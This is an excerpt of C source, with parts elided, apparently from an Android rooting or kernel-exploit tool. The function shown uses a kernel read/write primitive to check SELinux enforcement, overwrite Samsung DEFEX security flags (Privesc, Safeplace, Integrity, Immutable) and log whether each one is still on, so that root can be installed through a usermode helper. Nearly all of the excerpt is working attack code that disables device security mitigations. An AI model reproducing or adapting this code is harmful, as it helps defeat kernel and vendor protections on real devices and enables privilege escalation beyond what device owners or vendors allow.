...
static int install_workqueue_umh_root(int fd) {
  ...
  /* Device -EACCES diagnostics (2026-09-03 g0s run: umh retval=-13).
  ...
  uint8_t enf_before = 0xff, enf_after = 0xff;
  kernel_read_data(fd, selinux_addr, &enf_before, sizeof(enf_before));
  ...
  /* Disable Samsung DEFEX (Safeplace/Privesc/Integrity/Immutable) so the
   ...
   * Privesc interferes with KernelSU UID-0 transitions. */
  {
    ...
    uintptr_t defex_addrs[4] = {
      data_addr(GLOBAL_PRIVESC_STATUS),
      data_addr(GLOBAL_SAFEPLACE_STATUS),
      data_addr(GLOBAL_INTEGRITY_STATUS),
      data_addr(GLOBAL_IMMUTABLE_STATUS),
    };
    for (int i = 0; i < 4; i++) {
      uint8_t dbefore = 0xff, dafter = 0xff;
      kernel_read_data(fd, defex_addrs[i], &dbefore, sizeof(dbefore));
      ssize_t dwr = kernel_write_data(
          fd, defex_addrs[i], &defex_off, sizeof(defex_off));
      kernel_read_data(fd, defex_addrs[i], &dafter, sizeof(dafter));
      pr_info("root umh defex[%d] %u -> %u (addr=%016zx) wr=%zd%s\n", i,
              dbefore, dafter, defex_addrs[i], dwr,
              dafter ? " — STILL ON" : "");
    }
  }
